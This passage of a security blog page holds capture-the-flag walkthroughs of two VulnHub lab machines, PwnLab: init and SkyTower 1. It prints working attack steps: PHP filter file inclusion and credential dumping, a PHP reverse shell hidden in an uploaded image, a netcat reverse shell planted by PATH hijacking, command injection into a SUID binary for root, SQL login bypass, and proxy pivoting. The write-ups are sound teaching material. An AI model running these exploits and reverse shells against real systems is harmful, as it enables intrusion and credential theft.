        <span class="o">}</span>
<span class="o">}</span>

?&gt;
</code></pre></div></div>

<p>We can see in the index.php file that it includes any file without validating the input and adds the .php extension.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s2">"http://192.168.179.176/?page=php://filter/convert.base64-encode/resource=index"</span> | <span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'10p'</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'PD[^&lt;]*'</span> | <span class="nb">base64</span> <span class="nt">-d</span> | <span class="nb">tee </span>index.php
&lt;?php
//Multilingual. Not implemented yet.
//setcookie<span class="o">(</span><span class="s2">"lang"</span>,<span class="s2">"en.lang.php"</span><span class="o">)</span><span class="p">;</span>
<span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$_COOKIE</span><span class="o">[</span><span class="s1">'lang'</span><span class="o">]))</span>
<span class="o">{</span>
        include<span class="o">(</span><span class="s2">"lang/"</span>.<span class="nv">$_COOKIE</span><span class="o">[</span><span class="s1">'lang'</span><span class="o">])</span><span class="p">;</span>
<span class="o">}</span>
// Not implemented yet.
?&gt;
&lt;html&gt;
&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;center&gt;
&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">"images/pwnlab.png"</span><span class="o">&gt;</span>&lt;br /&gt;
<span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"/"</span><span class="o">&gt;</span>Home&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"?page=login"</span><span class="o">&gt;</span>Login&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"?page=upload"</span><span class="o">&gt;</span>Upload&lt;/a&gt; <span class="o">]</span>
&lt;hr/&gt;&lt;br/&gt;
&lt;?php
        <span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">'page'</span><span class="o">]))</span>
        <span class="o">{</span>
                include<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">'page'</span><span class="o">]</span>.<span class="s2">".php"</span><span class="o">)</span><span class="p">;</span>
        <span class="o">}</span>
        <span class="k">else</span>
        <span class="o">{</span>
                <span class="nb">echo</span> <span class="s2">"Use this server to upload and share image files inside the intranet"</span><span class="p">;</span>
        <span class="o">}</span>
?&gt;
&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div></div>

<p>The config.php file contains the credentials to log into MySQL</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s2">"http://192.168.179.176/?page=php://filter/convert.base64-encode/resource=config"</span> | <span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'10p'</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'PD[^&lt;]*'</span> | <span class="nb">base64</span> <span class="nt">-d</span> | <span class="nb">tee </span>config.php
&lt;?php
<span class="nv">$server</span>   <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
<span class="nv">$username</span> <span class="o">=</span> <span class="s2">"root"</span><span class="p">;</span>
<span class="nv">$password</span> <span class="o">=</span> <span class="s2">"H4u%QJ_H99"</span><span class="p">;</span>
<span class="nv">$database</span> <span class="o">=</span> <span class="s2">"Users"</span><span class="p">;</span>
?&gt;
</code></pre></div></div>

<p>Listing the tables from the database Users.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>mysql <span class="nt">-h</span> 192.168.179.176 <span class="nt">-u</span> root <span class="nt">-D</span> Users <span class="nt">-p</span>
Enter password: 
MySQL <span class="o">[</span>Users]&gt; show tables<span class="p">;</span>
+-----------------+
| Tables_in_Users |
+-----------------+
| <span class="nb">users</span>           |
+-----------------+
1 row <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.003 sec<span class="o">)</span>
</code></pre></div></div>

<p>Retrieving the records from the table users.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MySQL <span class="o">[</span>Users]&gt; <span class="k">select</span> <span class="k">*</span> from <span class="nb">users</span><span class="p">;</span>
+------+------------------+
| user | pass             |
+------+------------------+
| kent | <span class="nv">Sld6WHVCSkpOeQ</span><span class="o">==</span> |
| mike | <span class="nv">U0lmZHNURW42SQ</span><span class="o">==</span> |
| kane | <span class="nv">aVN2NVltMkdSbw</span><span class="o">==</span> |
+------+------------------+
3 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.004 sec<span class="o">)</span>
</code></pre></div></div>

<p>We save it to a file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">cat </span>mysql.users 
kent:Sld6WHVCSkpOeQ<span class="o">==</span> 
mike:U0lmZHNURW42SQ<span class="o">==</span> 
kane:aVN2NVltMkdSbw<span class="o">==</span>
</code></pre></div></div>

<p>I developed a bash script to decode the passwords in base64.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="k">for </span>x <span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>mysql.users<span class="si">)</span><span class="p">;</span> <span class="k">do
        </span><span class="nv">db64</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$x</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">':'</span> <span class="nt">-f</span> 2 | <span class="nb">base64</span> <span class="nt">-d</span><span class="si">)</span>
        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="nv">$x</span><span class="s2">  (</span><span class="se">\e</span><span class="s2">[1;33m</span><span class="nv">$db64</span><span class="se">\e</span><span class="s2">[0m)"</span>
<span class="k">done</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>bash decoder.sh
kent:Sld6WHVCSkpOeQ<span class="o">==</span>  <span class="o">(</span>JWzXuBJJNy<span class="o">)</span>
mike:U0lmZHNURW42SQ<span class="o">==</span>  <span class="o">(</span>SIfdsTEn6I<span class="o">)</span>
kane:aVN2NVltMkdSbw<span class="o">==</span>  <span class="o">(</span>iSv5Ym2GRo<span class="o">)</span>
</code></pre></div></div>

<p>We log into the login form with any user.</p>

<p><img src="/assets/images/pwnlab/screenshot-3.png" alt="" /></p>

<p><img src="/assets/images/pwnlab/screenshot-4.png" alt="" /></p>

<p>Was not possible that our PHP reverse shell to be interpreted using the previous parameter, we need another way, in the file index.php there is another point that allows including files through the superglobal $_COOKIE variable.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">head </span>index.php                                             
&lt;?php
//Multilingual. Not implemented yet.
//setcookie<span class="o">(</span><span class="s2">"lang"</span>,<span class="s2">"en.lang.php"</span><span class="o">)</span><span class="p">;</span>
<span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$_COOKIE</span><span class="o">[</span><span class="s1">'lang'</span><span class="o">]))</span>
<span class="o">{</span>
        include<span class="o">(</span><span class="s2">"lang/"</span>.<span class="nv">$_COOKIE</span><span class="o">[</span><span class="s1">'lang'</span><span class="o">])</span><span class="p">;</span>
<span class="o">}</span>
// Not implemented yet.
?&gt;
&lt;html&gt;
</code></pre></div></div>

<p>We can verify that it is possible including any file through cookies header.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">--cookie</span> <span class="s1">'lang=../../../../etc/passwd'</span> 192.168.179.176
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
Debian-exim:x:104:109::/var/spool/exim4:/bin/false
messagebus:x:105:110::/var/run/dbus:/bin/false
statd:x:106:65534::/var/lib/nfs:/bin/false
john:x:1000:1000:,,,:/home/john:/bin/bash
kent:x:1001:1001:,,,:/home/kent:/bin/bash
mike:x:1002:1002:,,,:/home/mike:/bin/bash
kane:x:1003:1003:,,,:/home/kane:/bin/bash
mysql:x:107:113:MySQL Server,,,:/nonexistent:/bin/false
...
</code></pre></div></div>

<p>We copy the pentestmonkey reverse shell to our current directory, change the IP address and port and attach the reverse shell to an image.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">cp</span> /usr/share/webshells/php/php-reverse-shell.php shell.php
root@kali:~<span class="nv">$ </span><span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s/127.0.0.1/192.168.179.1/;s/1234/443/'</span> shell.php 
root@kali:~<span class="nv">$ </span><span class="nb">cat </span>shell.php <span class="o">&gt;&gt;</span> tohru.png 
</code></pre></div></div>

<p>Then we upload the image.</p>

<p><img src="/assets/images/pwnlab/screenshot-5.png" alt="" /></p>

<p>This appears to be a harmless image, but isn’t.</p>

<p><img src="/assets/images/pwnlab/screenshot-6.png" alt="" /></p>

<p>We set up a netcat listener and execute the following curl request.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">--cookie</span> <span class="s1">'lang=../upload/f659f52b072e3f886046f726803ef421.png'</span> 192.168.179.176 <span class="nt">--output</span> out
</code></pre></div></div>

<p>We have a shell as user www-data and upgrade it to a TTY shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443                
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.176] 36455
Linux pwnlab 3.16.0-4-686-pae <span class="c">#1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) i686 GNU/Linux</span>
 10:14:42 up 56 min,  0 <span class="nb">users</span>,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
$ python -c "import pty; pty.spawn('</span>/bin/bash<span class="s1">')"
www-data@pwnlab:/$
</span></code></pre></div></div>

<p>We can use the passwords found previously to access as user kent, but I didn’t find anything.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@pwnlab:/<span class="nv">$ </span>su - kent
su - kent
Password: JWzXuBJJNy

kent@pwnlab:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="nb">ls</span> <span class="nt">-la</span>
total 32
drwxr-x--- 4 kent kent 4096 Dec 25 11:42 <span class="nb">.</span>
drwxr-xr-x 6 root root 4096 Mar 17  2016 ..
<span class="nt">-rw-r--r--</span> 1 kent kent  220 Mar 17  2016 .bash_logout
<span class="nt">-rw-r--r--</span> 1 kent kent 3515 Mar 17  2016 .bashrc
drwx------ 2 kent kent 4096 Dec 25 10:47 .gnupg
<span class="nt">-rw-r--r--</span> 1 kent kent  675 Mar 17  2016 .profile
drwx------ 2 kent kent 4096 Dec 25 10:39 .ssh
</code></pre></div></div>

<p>Then I switched to the user kent.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kent@pwnlab:~<span class="nv">$ </span>su - kane
su - kane
Password: iSv5Ym2GRo

kane@pwnlab:~<span class="nv">$ </span><span class="nb">ls
ls
</span>msgmike
</code></pre></div></div>

<p>In kane’s home directory there is an executable file, this executes the cat command without the absolute path.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kane@pwnlab:~<span class="nv">$ </span>file msgmike
file msgmike
msgmike: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, <span class="k">for </span>GNU/Linux 2.6.32, BuildID[sha1]<span class="o">=</span>d7e0b21f33b2134bd17467c3bb9be37deb88b365, not stripped

kane@pwnlab:~<span class="nv">$ </span>./msgmike
./msgmike
<span class="nb">cat</span>: /home/mike/msg.txt: No such file or directory

kane@pwnlab:~<span class="nv">$ </span>strings msgmike | <span class="nb">grep cat
</span>strings msgmike | <span class="nb">grep cat
cat</span> /home/mike/msg.txt
</code></pre></div></div>

<p>We will take advantage of this bad practice to escalate the user mike, we first need to export the PATH variable by adding the directory /tmp that will contain our malicious cat command, then we add a netcat reverse shell with the name cat and grant it execute permissions.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kane@pwnlab:/tmp<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
<span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
kane@pwnlab:/tmp<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'nc 192.168.179.1 443 -e /bin/bash'</span> <span class="o">&gt;</span> <span class="nb">cat
echo</span> <span class="s1">'nc 192.168.179.1 443 -e /bin/bash'</span> <span class="o">&gt;</span> <span class="nb">cat
</span>kane@pwnlab:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x <span class="nb">cat
chmod</span> +x <span class="nb">cat</span>
</code></pre></div></div>

<p>We set up a netcat listener and execute the msgmike binary.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kane@pwnlab:/tmp<span class="nv">$ </span>/home/kane/msgmike
/home/kane/msgmike 
</code></pre></div></div>

<p>We have a shell as user mike.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.176] 43777
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span>,1003<span class="o">(</span>kane<span class="o">)</span>
script <span class="nt">-qc</span> /bin/bash /dev/null
mike@pwnlab:/tmp<span class="err">$</span>
</code></pre></div></div>

<p>In mike’s home directory there is another binary with the SUID bit enabled, this writes the input provided by the user to a file called messages.txt in the root directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mike@pwnlab:/tmp<span class="nv">$ </span><span class="nb">cd</span> /home/mike
<span class="nb">cd</span> /home/mike
mike@pwnlab:/home/mike<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> msg2root
<span class="nb">ls</span> <span class="nt">-la</span> msg2root
<span class="nt">-rwsr-sr-x</span> 1 root root 5364 Mar 17  2016 msg2root

mike@pwnlab:/home/mike<span class="nv">$ </span>strings ./msg2root
strings ./msg2root
...
Message <span class="k">for </span>root:                                                                                                                                                   
/bin/echo %s <span class="o">&gt;&gt;</span> /root/messages.txt
...
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="suid-binary">SUID Binary</h3>

<p>We can get a root shell by simply entering a semicolon followed by /bin/bash.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mike@pwnlab:/home/mike<span class="nv">$ </span>./msg2root
./msg2root
Message <span class="k">for </span>root: <span class="p">;</span>/bin/sh
<span class="p">;</span>/bin/sh

<span class="c"># id</span>
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1003<span class="o">(</span>kane<span class="o">)</span>

<span class="c"># python -c "import os; os.setuid(0); os.setgid(0); os.system('/bin/bash')"</span>
python <span class="nt">-c</span> <span class="s2">"import os; os.setuid(0); os.setgid(0); os.system('/bin/bash')"</span>
root@pwnlab:/home/mike# <span class="nb">cd</span> /root
<span class="nb">cd</span> /root
root@pwnlab:/root# <span class="nb">ls
ls
</span>flag.txt  messages.txt


root@pwnlab:/root# /bin/cat flag.txt
/bin/cat flag.txt
.-<span class="o">=</span>~<span class="o">=</span>-.                                                                 .-<span class="o">=</span>~<span class="o">=</span>-.
<span class="o">(</span>__  _<span class="o">)</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">(</span>__  _<span class="o">)</span>
<span class="o">(</span>_ ___<span class="o">)</span>  _____                             _                            <span class="o">(</span>_ ___<span class="o">)</span>
<span class="o">(</span>__  _<span class="o">)</span> /  __ <span class="se">\ </span>                          | |                           <span class="o">(</span>__  _<span class="o">)</span>
<span class="o">(</span> _ __<span class="o">)</span> | /  <span class="se">\/</span> ___  _ __   __ _ _ __ __ _| |_ ___                      <span class="o">(</span> _ __<span class="o">)</span>
<span class="o">(</span>__  _<span class="o">)</span> | |    / _ <span class="se">\|</span> <span class="s1">'_ \ / _` | '</span>__/ _<span class="sb">`</span> | __/ __|                     <span class="o">(</span>__  _<span class="o">)</span>
<span class="o">(</span>_ ___<span class="o">)</span> | <span class="se">\_</span>_/<span class="se">\ </span><span class="o">(</span>_<span class="o">)</span> | | | | <span class="o">(</span>_| | | | <span class="o">(</span>_| | |_<span class="se">\_</span>_ <span class="se">\ </span>                    <span class="o">(</span>_ ___<span class="o">)</span>
<span class="o">(</span>__  _<span class="o">)</span>  <span class="se">\_</span>___/<span class="se">\_</span>__/|_| |_|<span class="se">\_</span>_, |_|  <span class="se">\_</span>_,_|<span class="se">\_</span>_|___/                     <span class="o">(</span>__  _<span class="o">)</span>
<span class="o">(</span> _ __<span class="o">)</span>                     __/ |                                       <span class="o">(</span> _ __<span class="o">)</span>
<span class="o">(</span>__  _<span class="o">)</span>                    |___/                                        <span class="o">(</span>__  _<span class="o">)</span>
<span class="o">(</span>__  _<span class="o">)</span>                                                                 <span class="o">(</span>__  _<span class="o">)</span>
<span class="o">(</span>_ ___<span class="o">)</span> If  you are  reading this,  means  that you have  <span class="nb">break</span> <span class="s1">'init'</span>  <span class="o">(</span>_ ___<span class="o">)</span>
<span class="o">(</span> _ __<span class="o">)</span> Pwnlab.  I hope  you enjoyed  and thanks  <span class="k">for  </span>your <span class="nb">time </span>doing  <span class="o">(</span> _ __<span class="o">)</span>
<span class="o">(</span>__  _<span class="o">)</span> this challenge.                                                 <span class="o">(</span>__  _<span class="o">)</span>
<span class="o">(</span>_ ___<span class="o">)</span>                                                                 <span class="o">(</span>_ ___<span class="o">)</span>
<span class="o">(</span> _ __<span class="o">)</span> Please send me  your  feedback or your  writeup,  I will  love  <span class="o">(</span> _ __<span class="o">)</span>
<span class="o">(</span>__  _<span class="o">)</span> reading it                                                      <span class="o">(</span>__  _<span class="o">)</span>
<span class="o">(</span>__  _<span class="o">)</span>                                                                 <span class="o">(</span>__  _<span class="o">)</span>
<span class="o">(</span>__  _<span class="o">)</span>                                             For sniferl4bs.com  <span class="o">(</span>__  _<span class="o">)</span>
<span class="o">(</span> _ __<span class="o">)</span>                                claor@PwnLab.net - @Chronicoder  <span class="o">(</span> _ __<span class="o">)</span>
<span class="o">(</span>__  _<span class="o">)</span>                                                                 <span class="o">(</span>__  _<span class="o">)</span>
<span class="o">(</span>_ ___<span class="o">)</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">=</span>-._.-<span class="o">(</span>_ ___<span class="o">)</span>
<span class="sb">`</span>-._.-<span class="s1">'                                                                 `-._.-'</span>
</code></pre></div></div>

  
    <h1 class="post-title">VulnHub - SkyTower 1</h1>
	<p class="post-date text-bold text-upcase">
	<span>December 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> You will require skills across different facets of system and application vulnerabilities, as well as an understanding of various services and how to attack them. Most of all, your logical thinking and methodical approach to penetration testing will come into play to allow you to successfully attack this system.</p>

<p><strong>Author:</strong> Telspace</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/skytower-1,96/">https://www.vulnhub.com/entry/skytower-1,96/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>A ping sweep on the local network discovered the target machine, the script you can download it <a href="https://github.com/s4rgaz/hdiscovery.git">here</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hdiscovery.py <span class="nt">-r</span> 192.168.179.0/24
192.168.179.175 <span class="o">=&gt;</span> up
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>A full TCP port scan with nmap discovered two open ports and one that is filtered.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p-</span> <span class="nt">-T4</span> 192.168.179.175 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
...
PORT     STATE    SERVICE
22/tcp   filtered ssh
80/tcp   open     http
3128/tcp open     squid-http
...
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>An aggressive scan with nmap discovered more information about the open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p80</span>,3128 192.168.179.175 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.2.22 <span class="o">((</span>Debian<span class="o">))</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Site doesn<span class="s1">'t have a title (text/html).
3128/tcp open  http-proxy Squid http proxy 3.1.20
|_http-server-header: squid/3.1.20
|_http-title: ERROR: The requested URL could not be retrieved
...
</span></code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>The web application contains a login form, by adding a single quote in the user field it was possible to detect that MySQL is running.</p>

<p><img src="/assets/images/skytower1/screenshot-1.png" alt="" /></p>

<p><img src="/assets/images/skytower1/screenshot-2.png" alt="" /></p>

<p>After of try various manual tests for a possible login bypass, I found the following SQL statement that worked.</p>

<p><img src="/assets/images/skytower1/screenshot-3.png" alt="" /></p>

<p>We can see the credentials to access via SSH.</p>

<p><img src="/assets/images/skytower1/screenshot-4.png" alt="" /></p>

<h3 id="squid-enumeration">Squid Enumeration</h3>

<p>Squid is a caching proxy for the Web supporting HTTP, HTTPS, FTP, and more. It reduces bandwidth and improves response times by caching and reusing frequently-requested web pages.</p>

<p>We can also use it to enumerate services that are running locally on the server or that we can’t access.</p>

<p><img src="/assets/images/skytower1/screenshot-5.png" alt="" /></p>

<p>If we remember the SSH service on port 22 is filtered, to be able to access through the proxy we need to add <strong>http 192.168.179.175 3128</strong> at the end of the file <strong>/etc/proxychains4.conf</strong>.</p>

<p>As we are going to be using proxychains it is necessary to start the TOR service, the following scan with nmap through proxychains reveals that the SSH service is open.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>systemctl start tor

root@kali:~<span class="nv">$ </span>proxychains nmap <span class="nt">-sT</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-p22</span> 192.168.179.175 
...
PORT   STATE SERVICE
22/tcp open  ssh
</code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>
<h3 id="access-via-ssh">Access via SSH</h3>

<p>Now we can login via SSH using the proxy.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>proxychains ssh john@192.168.179.175
<span class="o">[</span>proxychains] config file found: /etc/proxychains4.conf
<span class="o">[</span>proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
<span class="o">[</span>proxychains] DLL init: proxychains-ng 4.14
<span class="o">[</span>proxychains] Dynamic chain  ...  192.168.179.175:3128  ...  192.168.179.175:22  ...  OK
john@192.168.179.175<span class="s1">'s password: 
Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jun 20 07:41:08 2014

Funds have been withdrawn
Connection to 192.168.179.175 closed.
</span></code></pre></div></div>

<p>The connection is established but we don’t get a shell, we can bypass this simply adding <strong>/bin/bash</strong> as follows.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>proxychains ssh john@192.168.179.175 /bin/bash
<span class="o">[</span>proxychains] config file found: /etc/proxychains4.conf
<span class="o">[</span>proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
<span class="o">[</span>proxychains] DLL init: proxychains-ng 4.14
<span class="o">[</span>proxychains] Dynamic chain  ...  192.168.179.175:3128  ...  192.168.179.175:22  ...  OK
john@192.168.179.175<span class="s1">'s password:
id
uid=1000(john) gid=1000(john) groups=1000(john)
</span></code></pre></div></div>

<p>Now we can execute system commands, in the <strong>/var/www</strong> directory there is a file named login.php that contains the credentials to log into MySQL.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">pwd</span>
/var/www
<span class="nb">head</span> <span class="nt">-n</span> 8 login.php
&lt;?php

<span class="nv">$db</span> <span class="o">=</span> new mysqli<span class="o">(</span><span class="s1">'localhost'</span>, <span class="s1">'root'</span>, <span class="s1">'root'</span>, <span class="s1">'SkyTech'</span><span class="o">)</span><span class="p">;</span>

<span class="k">if</span><span class="o">(</span><span class="nv">$db</span>-&gt;connect_errno <span class="o">&gt;</span> 0<span class="o">){</span>
    die<span class="o">(</span><span class="s1">'Unable to connect to database ['</span> <span class="nb">.</span> <span class="nv">$db</span>-&gt;connect_error <span class="nb">.</span> <span class="s1">']'</span><span class="o">)</span><span class="p">;</span>

<span class="o">}</span>
</code></pre></div></div>

<p>The following one-line instruction lists the available databases.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql <span class="nt">-u</span> root <span class="nt">-proot</span> <span class="nt">-e</span> <span class="s2">"show databases"</span>
Database
information_schema
SkyTech
mysql
performance_schema
</code></pre></div></div>

<p>Enumerating the SkyTech database tables.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql <span class="nt">-u</span> root <span class="nt">-proot</span> <span class="nt">-e</span> <span class="s2">"use SkyTech; show tables"</span>
Tables_in_SkyTech
login
